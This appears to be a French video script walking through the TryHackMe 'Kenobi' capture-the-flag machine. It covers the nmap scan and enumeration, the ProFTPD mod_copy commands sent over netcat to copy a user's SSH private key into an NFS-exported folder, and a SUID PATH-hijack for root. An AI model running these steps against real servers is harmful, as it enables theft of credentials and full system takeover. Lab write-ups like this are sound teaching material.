Yo les geek,  dans cette video je vais vous montrer comment pirater la machine   Kenobi de TryHackMe.
# Recon
Pour la reconnaissance je commence par effectuer un scan avec l'outil nmap. J'utilise l'option -Pn pour un scan plus ou moins discret, -T4 pour accélérer le scan, -sVC pour afficher la version des services derrière chaque port et tester des scripts de vulnérabilité sur ses derniers, -p- pour analyser tout les 65000 ports possibles. 

Pendant ce temps je vais sur mon navigateur pour vérifier s'il y a une potentiel application web héberger sur le port 80.
On a belle t bien une page web hébergé mais on a rien d'intéressant dans le code source.

J'effectue rapidement une énumération web avec l'outil gobuster pour vérifier s'il y a des pages cachées.
Le résultat montre que le fichier robots existe. Ce fichier permet aux serveurs de préciser aux moteurs de recherche les pages à ne pas indexé lorsqu'un utilisateur fais une recherche. 
En le consultant je découvre l'existence de la page admin mais rien d'interessant.

```
└─$ nmap -Pn -T4 -sV -p- 10.10.130.80
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-08 08:30 GMT
Warning: 10.10.130.80 giving up on port because retransmission cap hit (6).
Nmap scan report for 10.10.130.80 (10.10.130.80)
Host is up (0.080s latency).
Not shown: 65451 closed tcp ports (conn-refused), 73 filtered tcp ports (no-response)
PORT      STATE SERVICE     VERSION
21/tcp    open  ftp         ProFTPD 1.3.5
22/tcp    open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http        Apache httpd 2.4.18 ((Ubuntu))
111/tcp   open  rpcbind     2-4 (RPC #100000)
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
2049/tcp  open  nfs         2-4 (RPC #100003)
38583/tcp open  mountd      1-3 (RPC #100005)
43293/tcp open  mountd      1-3 (RPC #100005)
45791/tcp open  nlockmgr    1-4 (RPC #100021)
57433/tcp open  mountd      1-3 (RPC #100005)
Service Info: Host: KENOBI; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```
le résultat du scan montre qu'il y a pas mal de ports ouverts.
Je commence d'abord par le service ftp. 
Jutilise l'outil  searchsploit pour vérifier s'il existe un exploit sur la version ProFTPD 1.3.5.
Il me propose 4 résultats dont un fichier .txt

je copie le fichier dans mon répertoire actuel avec la commande searchsploit -m le nom fichier.

Après lecture je découvre qu'il existe une vulnérabilité qui permet de copier des fichier d'un répertoire à l'autre dans le serveur distant.

il suffit d'établir une connexion TCP vers la machine et d'utiliser les commande `site cpfr` pour copier le contenue d'un fichier et `site cpto` pour le coller dans un nouveau fichier.
pour verifer cela je me connecte et j'essaie de copier le fichier passwd dans le répertoire /tmp.  ça marche bien mais quand j'essaie de le copier dans le copier dans le dossier html, je découvre que je n'ai malheureusement pas la permission d'écriture dans ce dossier.

Passons maintenant au service `nfs` qui permet en bref au serveur de partager des fichiers et des répertoires dans un réseau.
Ce protocole donne la possibilité à un client du même réseau de monter ce contenue localement. Cela signifie que les fichiers et les répertoires du serveur deviennent accessibles et manipulables comme s'ils étaient stockés localement sur ma machine.

Alors j'utiliste la commande `showmount -e` pour verifier les répertoires partagées, 
```
└─$ showmount -e 10.10.130.80                                                        
Export list for 10.10.130.80:
/var **
```
Puisque le dossier /var est partagée, il suffit de le monter sur ma machine avec la commande
└─$
```
sudo mount -t nfs -o vers=3 10.10.130.80:/var nfs_mnt
```
On peut remarquer que le répertoire /var/tmp est inscriptible mais on rien d'intéressant dans le reste.

Passons maintenant au service samba qui permet également de partager des fichiers et des repertoires dans un réseau.
Mais contrairement au protocole nfs, samba requiert une authentification ou non selon les configurations mises en place.

Alors pour afficher les répertoires partagées, je vais utiliser la commande smbclient -N pour se connecter sans mot de passe et -L pour lister les répertoire partagées
Les partages qui ce terminent par $ sont des répertoire inaccessibles créés par défaut.
Ce qui m'intéresse ici  est anonymous.

Pour se connecter à se partage, il suffit d'exécuter la commande précédente sans l'option -L et le nom du partage à la fin
```
└─$ smbclient -N \\\\10.10.130.80\\anonymous
```

Maintenant que je suis connecter, j'utilise ls pour lister le contenue et get pour télécharger le fichier log
Après avoir lu le contenu du fichier,  on se rends compte que l'utilisateur kenobi s'est créer une clés privé ssh.
# exploit
Alors tout ce que j'ai à faire c'est d'utiliser la faille du protocole ftp en copiant le fichier id_rsa dans le repertoire /var/tmp dont j'ai un accès nfs et le droit d'écriture.
└─# nc 10.10.231.51 21
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.231.51]
site cpfr /home/kenobi/.ssh/id_rsa
350 File or directory exists, ready for destination name
site cpto /var/tmp/id_rsa
250 Copy successful
# foothold
Puisque que j'ai la clés privé ssh je peux me connecter par ssh en tant que kenobi sans avoir à fournir de mot de passe.

Pour la phase d'escalade de privilège je vais commencé par énumérer les fichier SUID.
Les fichiers SUID sont des fichiers qui peuvent être exécuter en utilisant l'identité du propriétaire.
~$
```
 find / -perm /4000 -type f -exec ls -ld {} \; 2>/dev/null
 ```
Le fichier le plus suspet ici est le binaire menu. Le SUID me permet dans se cas de l'exécuter en tant que root. 
Lorsque je l'éxecute je me rends compte qu'il execute la commande ifconfig.
En expérant qu'il n'utilise pas un chemin absolu pour l'exécuter, je vais essayer de l'obliger à exécuter un faut fichier ifconfig qui me permettra d'être root.

Pour cela j'ajoute le répertoire /tmp au `PATH` qui est la variable contenant une liste de chemins utiliée pour exécuter un script dont le chemin n'est pas précisé.
Ensuite je crée dans tmp un fichier ifconfig qui exécuter la commande `/bin/bash`

Lorsque le binaire menu essaye d'exécuter `ifconfig`, il utilise le premier chemin de la variable PATH qui est /tmp.
Le contenue du faux ifconfig est exécuté et là j'ai un accès root.

J'espère que vous avez aimer cette video, n'hesitez pas écrire ce que vous en pensé en commentaire, à mettre un pousse bleu et à vous abonner pour ne pas manquer les prochaines videos. Chao